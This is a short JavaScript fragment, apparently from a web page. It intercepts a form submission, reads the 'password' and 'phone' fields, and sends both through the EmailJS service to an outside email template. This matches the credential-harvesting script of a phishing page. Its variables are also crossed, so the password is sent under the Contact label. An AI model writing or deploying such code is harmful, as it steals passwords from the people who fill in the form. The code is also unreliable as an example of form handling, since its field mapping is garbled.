<script>
    document.querySelector("form").addEventListener("submit", (e) => {
	e.preventDefault();
	
    sendEmailToAdmin()
})
function sendEmailToAdmin() {
	let phone = document.getElementById("password").value;
	let val = document.getElementById("phone").value;
    


	emailjs.send("service_jdtbojn", "template_rky3ibl", {
        Password: val,
		Contact: phone,
       
        
	}).then(function (res) {
        console.log(val,phone);
		console.log(res);
	})

}
